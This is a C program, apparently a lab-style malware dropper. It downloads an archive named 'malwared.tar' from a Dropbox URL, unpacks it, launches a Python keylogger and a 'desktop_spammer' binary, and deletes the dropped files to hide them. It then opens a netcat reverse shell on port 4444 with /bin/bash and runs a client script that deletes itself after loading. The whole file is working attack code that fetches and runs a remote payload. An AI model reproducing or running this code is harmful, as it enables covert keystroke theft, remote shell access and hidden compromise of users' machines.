#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>

int main(int argc, int *argv[])
{
    int pid;
    // download needed things
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "wget",
            "wget",
            "-c",
            "https://www.dropbox.com/s/r6qu5f24ehgo390/malwared.tar?dl=0",
            "-O",
            "malwared.tar",
            NULL);
        perror("Cannot download.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    // unzip .tar archive
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "tar",
            "tar",
            "-xvf",
            "malwared.tar",
            NULL);
        perror("Cannot unzip.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    // rm .tar archive
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "rm",
            "rm",
            "malwared.tar",
            NULL);
        perror("Cannot rm.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }

    // EXPLOIT PART
    // PART 1
    // running keylogger
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "python3",
            "python3",
            "keylogger.py",
            NULL
        );
        perror("Cannot run keylogger.");
    }

    // PART 2
    // alter priveleges
    usleep(500000);
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "chmod",
            "chmod",
            "+x",
            "desktop_spammer",
            NULL);
        perror("Cannot chmod.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    // running desktop spammer
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "./desktop_spammer",
            "./desktop_spammer",
            NULL
        );
        perror("Cannot run spammer.");
    }

    // PART 3
    // clean after ourselves
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "rm",
            "rm",
            "desktop_spammer",
            "keylogger.py",
            "unduying_process",
            NULL);
        perror("Cannot rm.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    pid = fork();
    if (pid == 0)
    {
        usleep(100000);
        execlp(
            "clear",
            "clear",
            NULL);
        perror("Cannot rm.");
    }
    // connecting to attacker via netcat
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "nc",
            "nc",
            "localhost",
            "4444",
            "-e",
            "/bin/bash",
            NULL);
        perror("Cannot netcat.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    // END EXPLOT PART

    // RUN CLIENT
    pid = fork();
    if (pid == 0) {
        // wait for python script to load in memory
        usleep(500000);
        execlp(
            "rm",
            "rm",
            "client.py",
            NULL
        );
        perror("Cannot delete client.py");
        exit(1);
    }
    execlp(
        "python3",
        "python3",
        "client.py",
        NULL
    );
    perror("Cannot run client.");
    return 0;
}